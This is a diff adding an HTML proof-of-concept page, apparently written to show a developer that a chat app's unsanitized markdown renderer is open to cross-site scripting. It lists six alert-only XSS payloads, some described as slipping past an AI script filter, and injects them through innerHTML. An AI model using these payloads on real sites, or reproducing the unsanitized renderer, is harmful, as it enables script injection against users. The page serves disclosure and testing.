@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Test - Proof of Vulnerability</title>
+</head>
+<body>
+    <h1>XSS Vulnerability Test</h1>
+    <p>This demonstrates that even though the AI filters scripts, the client-side renderer is still vulnerable.</p>
+    
+    <div id="vulnerable-area">
+        <h2>Vulnerable Markdown Renderer Simulation</h2>
+        <div id="output"></div>
+    </div>
+
+    <script>
+        // Simulate the vulnerable markdown renderer from your app
+        function renderMarkdown(text) {
+            // This is exactly what your app does - no sanitization!
+            return text
+                .replace(/\*\*(.*?)\*\*/gim, '<strong>$1</strong>')
+                .replace(/\*(.*?)\*/gim, '<em>$1</em>')
+                .replace(/`([^`]+)`/gim, '<code>$1</code>')
+                .replace(/\n/gim, '<br>');
+        }
+
+        // Test payloads that bypass AI filtering
+        const maliciousPayloads = [
+            // Direct script injection (AI would filter this)
+            `<script>alert('Direct XSS')</script>`,
+            
+            // Image-based XSS (might pass AI filtering)
+            `<img src="x" onerror="alert('Image XSS')">`,
+            
+            // SVG-based XSS
+            `<svg onload="alert('SVG XSS')"></svg>`,
+            
+            // Event handler in legitimate HTML
+            `<a href="#" onclick="alert('Click XSS')">Click me</a>`,
+            
+            // CSS-based injection
+            `<div style="background:url('javascript:alert(\"CSS XSS\")')">Styled div</div>`,
+            
+            // Data URI attack
+            `<iframe src="data:text/html,<script>alert('Data URI XSS')</script>"></iframe>`
+        ];
+
+        // Test each payload
+        maliciousPayloads.forEach((payload, index) => {
+            const testDiv = document.createElement('div');
+            testDiv.innerHTML = `<h3>Test ${index + 1}:</h3>` + 
+                               `<div>Payload: ${payload}</div>` +
+                               `<div>Rendered Output:</div>` +
+                               `<div style="border: 1px solid red; padding: 10px; margin: 5px;">${renderMarkdown(payload)}</div>`;
+            document.getElementById('output').appendChild(testDiv);
+        });
+
+        // Show that localStorage can be accessed
+        localStorage.setItem('testData', 'sensitive user data');
+        console.log('LocalStorage accessible:', localStorage.getItem('testData'));
+    </script>
+</body>
+</html>
